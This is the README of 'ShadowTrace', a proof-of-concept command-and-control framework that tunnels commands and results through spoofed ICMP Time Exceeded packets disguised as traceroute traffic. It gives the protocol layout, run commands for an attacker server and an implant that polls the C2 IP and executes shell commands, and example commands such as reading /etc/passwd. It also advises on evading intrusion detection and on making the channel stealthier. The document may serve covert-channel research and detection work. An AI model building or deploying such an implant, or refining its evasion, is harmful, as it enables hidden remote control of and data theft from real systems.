# ShadowTrace C2 - High-Bandwidth Stealth C2 via Traceroute Mimicry

## Overview

**ShadowTrace** is a proof-of-concept (PoC) C2 (Command & Control) framework that implements a novel covert channel using ICMP Type 11 (Time Exceeded) packets. The system appears as a traceroute in progress, providing stealth by:

1. **Spoofing intermediate router IPs** along the traceroute path
2. **Embedding command data** in Time Exceeded payload (inner IP header + data)
3. **Using ICMP.seq as an upstream data carrier** (16-bit per packet)
4. **Bandwidth amplification** - Time Exceeded packets carry 512-byte chunks vs 2-byte upstream

## Architecture

### Two-Stage Protocol

#### **Phase 1: Real Traceroute Mimicry**
- Client sends normal ICMP Echo Requests with increasing TTL (1-4)
- Real routers respond with Time Exceeded
- **Appearance**: "Normal traceroute in progress"

#### **Phase 2: C2 Intervention (Downstream)**
- Client continues echo probes (TTL increases beyond real hops)
- Server responds with spoofed Time Exceeded packets (not from real routers)
- **Spoof IPs**: Server IP + 1, Server IP + 2, ... (appearing as "additional hops")
- **Data carrier**: ICMP Type 11 inner payload (512 bytes/packet)
- **Metadata**: Outer IP.id encodes [Session ID: 4bit][Chunk Index: 10bit][Flag: 2bit]

#### **Phase 3: Command Execution**
- Client parses downstream command chunks
- Executes command locally (shell)
- Collects output for upstream transmission

#### **Phase 4: Upstream Result Transmission**
- Client sends Echo Requests with ICMP.seq as data carrier (2 bytes/packet)
- **Spoof IPs**: Continue from Phase 2 (Server IP + N+1, Server IP + N+2, ...)
- Server accumulates result data via ICMP.seq field
- **Bandwidth**: 2 bytes upstream vs 512 bytes downstream (256x amplification)

## Files

| File | Role | Purpose |
|------|------|---------|
| `server.py` | C2 Server | Listens for client probes, sends commands, receives results |
| `client.py` | Implant | Mimics traceroute, receives commands, executes, returns results |
| `README.md` | This file | Documentation |

## Protocol Details

### Metadata Encoding (IP.id)

```
IP.id (16 bits) = [Session ID: 4bit][Chunk Index: 10bit][Flag: 2bit]

Flag values:
  FLAG_DATA  = 0x0  (normal data / next chunk request)
  FLAG_ACK   = 0x1  (initial command request)
  FLAG_RETRY = 0x2  (retransmit request)
  FLAG_END   = 0x3  (final chunk)
```

### Downstream Data Carrier

**Type 11 Time Exceeded packet structure (RFC 792 compliant):**
```
Outer IP:     src=spoofed_router_ip, dst=client_ip
Outer ICMP:   type=11 (Time Exceeded), id=0x5354 ("ST")
Inner IP:     src=server_ip, dst=client_ip, ttl=1, id=outer_ip_id
Inner ICMP:   type=8 (Echo Request), id=0x5354, seq=chunk_idx
Inner Raw:    load=command_data (up to 512 bytes/packet)

Payload = outer_ip.id (metadata) + inner_ip_header + inner_icmp_header + command_data
```

### Upstream Data Carrier

**Type 8 Echo Request packet structure:**
```
Outer IP:     src=client_ip, dst=server_ip, ttl=T, id=[session:chunk:flag]
Outer ICMP:   type=8 (Echo Request), id=0x5354, seq=data_word
Raw payload:  ICMP_PAYLOAD (fixed OS ping pattern, 48 bytes)

data_word = 16 bits of actual result data (big-endian 16-bit integer)
ICMP_PAYLOAD = bytes(0x08..0x37) - mimics Linux ping default
```

## Usage

### Prerequisites

```bash
pip install scapy
sudo # root privileges required (raw socket access)
```

### Server (Attacker)

```bash
sudo python3 server.py <SERVER_IP>
```

**Example:**
```bash
sudo python3 server.py 192.168.1.100
```

**Interactive CLI:**
```
C2> whoami
C2> id
C2> cat /etc/passwd
C2> stats
C2> queue
C2> clear
C2> exit
```

### Client (Implant)

```bash
sudo python3 client.py <C2_SERVER_IP> [POLL_INTERVAL_SEC]
```

**Example:**
```bash
sudo python3 client.py 192.168.1.100 5
```

- Runs in infinite loop
- Polls server every 5 seconds for commands
- Executes commands locally
- Sends results back to server
- **Ctrl+C** to stop

## Key Features

### 1. **No libpcap Dependency**
- Uses Scapy `lfilter` parameter instead of BPF filters
- Eliminates requirement for libpcap library
- Simpler deployment on restricted systems

### 2. **Race-Condition Free**
- AsyncSniffer with `.started.wait()` ensures socket is ready before sending
- No packet loss between sniff startup and probe transmission
- Reliable per-chunk delivery

### 3. **Traceroute Mimicry**
- **3 probes per TTL** (matches real traceroute behavior)
- **PROBES_PER_TTL=3** ensures IDS sees realistic traffic pattern
- Server responds to all 3 probes (mimics real router behavior)

### 4. **IDS/NDR Evasion**
- Outer ICMP Type 11 appears as legitimate Time Exceeded from routers
- Inner payload is NOT inspected by typical IDS rules
- **Bandwidth amplification**: 512-byte downstream payload vs 2-byte upstream
- Traffic appears as "failed traceroute" or "in-progress traceroute"

### 5. **Session Management**
- 4-bit session ID (16 concurrent sessions)
- 10-bit chunk index (1024 max chunks per command)
- Per-session state tracking
- Automatic session cleanup after completion

## Packet Flow Example

### Downstream (Server → Client) - One Chunk

```
[Client TTL=5] Echo-Req#1 --→ [Server]
                           ← Type11 (chunk 0) from 192.168.1.101

[Client TTL=5] Echo-Req#2 --→ [Server]
                           ← Type11 (chunk 0) from 192.168.1.101

[Client TTL=5] Echo-Req#3 --→ [Server]
                           ← Type11 (chunk 0) from 192.168.1.101

Client receives first Type11, extracts chunk 0 data
```

### Upstream (Client → Server) - One Result Chunk

```
[Client TTL=N+M+1] Echo-Req#1 + seq=0xABCD --→ [Server]
                                          ← Type11 (ack) from 192.168.1.101

[Client TTL=N+M+1] Echo-Req#2 + seq=0xEF00 --→ [Server]
                                          ← Type11 (ack) from 192.168.1.101

[Client TTL=N+M+1] Echo-Req#3 + seq=0x1234 --→ [Server]
                                          ← Echo Reply (completion) from 192.168.1.100
```

Server accumulates ICMP.seq values (16-bit each), reconstructs result bytes

## Security Considerations

### Stealth
- ✅ Outer packets (Type 11) are legitimate-looking router responses
- ✅ No suspicious DNS/HTTP/TCP traffic
- ✅ Bandwidth amplification hides bulk of command data
- ⚠️  Timing patterns (regular probes) may reveal automated activity

### Detection Vectors
- **Flow-based detection**: Continuous TTL increment beyond real routers
- **Behavioral analysis**: Probes never reach actual destination (no Echo Reply until final chunk)
- **Geolocation mismatch**: Spoofed router IPs don't match actual topology
- **Payload inspection**: Deep packet inspection of inner ICMP Type 8 (if policies allow)

### Mitigations
- Randomize probe timing and interval
- Use realistic base IP for spoofing (match actual network topology)
- Limit command size to avoid excessive probe sequence
- Implement secondary encoding in result data

## Technical Notes

### Scapy Layers in Type 11

Scapy automatically parses Time Exceeded into layers:
```python
IP / ICMP(type=11) / IPerror / ICMPerror / Raw(load=<data>)
```

The `extract_inner_payload()` function in client.py uses two strategies:
1. **Layer-aware**: Access via `IPerror` layer (handles IP options)
2. **Byte-offset fallback**: Parse as raw bytes (offset 20+8 for standard case)

### Checksum Handling

Scapy automatically recalculates ICMP/IP checksums when:
- A packet is built via `/` operator
- The packet is converted to bytes via `bytes(pkt)`
- Explicit deletion: `del pkt[ICMP].chksum` forces recalculation

### OS Echo Suppression

Server sets `icmp_echo_ignore_all=1` to disable OS auto-reply, allowing the C2 server to fully control ICMP responses and maintain traceroute mimicry.

## Performance

### Bandwidth
- **Downstream**: 512 bytes/probe × 3 probes/TTL ≈ 1536 bytes/command chunk
- **Upstream**: 2 bytes/probe × 3 probes/TTL ≈ 6 bytes/result chunk
- **Amplification**: 512:2 = 256× downstream advantage

### Latency
- **Per-chunk RTT**: ~100-300ms (PROBE_TIMEOUT + network latency)
- **Command delivery**: 5 chunks × 200ms ≈ 1 second
- **Result return**: 100 bytes = 50 chunks × 200ms ≈ 10 seconds

## References

- **RFC 792**: INTERNET CONTROL MESSAGE PROTOCOL (https://tools.ietf.org/html/rfc792)
- **Scapy Documentation**: https://scapy.readthedocs.io/
- **Traceroute Command**: Man pages for `traceroute` (BSD/Linux)

## Testing

### Docker Lab Verification

```bash
# Terminal 1: Start server
docker exec -u root attacker sudo python3 /path/to/server.py 172.30.2.10

# Terminal 2: Start client
docker exec -u root client sudo python3 /path/to/client.py 172.30.2.10 5

# Terminal 3: Monitor traffic
docker exec relay tcpdump -i eth0 'icmp' -v
docker exec relay tcpdump -i eth1 'icmp' -v
docker exec attacker tcpdump -i eth0 'icmp' -v
docker exec client tcpdump -i eth0 'icmp' -v
```

### Manual Testing

1. **Client starts and runs Phase 1 (real traceroute)**
   - Look for TTL=1..4 Echo Requests with id=0xDEAD

2. **Server CLI receives client probes**
   - Logs show "Echo-Req" messages with decoded session/chunk/flag

3. **Queue a command via server CLI**
   - Input: `whoami`
   - Server splits into chunks and prepares for transmission

4. **Client transitions to Phase 2 (C2 intervention)**
   - TTL increments beyond real hop count
   - Receives Type 11 from incrementing spoofed IPs
   - Extracts command data from inner payload

5. **Command executes and result uploads**
   - Phase 3: Local execution
   - Phase 4: Result transmitted upstream via ICMP.seq
   - Server reassembles and displays result

## Limitations

1. **Session ID**: Only 4 bits (16 concurrent sessions max)
2. **Chunk size**: 512 bytes downstream, 2 bytes upstream (asymmetric)
3. **Reliability**: No retransmission logic (single probe loss = chunk miss)
4. **Latency**: PROBE_TIMEOUT=1.0s per probe adds overhead
5. **Addressability**: Single C2 server IP (no failover or redundancy)

## Future Enhancements

- Implement selective retransmission on probe loss
- Add encryption/obfuscation to inner payload
- Implement dynamic TTL range to adapt to network topology
- Add DNS exfiltration as secondary channel
- Support multiple C2 servers with load balancing

## Author
[Daiki Ito](https://x.com/olc_felis)  
[Ayato Shitomi](https://x.com/AyatoShitomi)
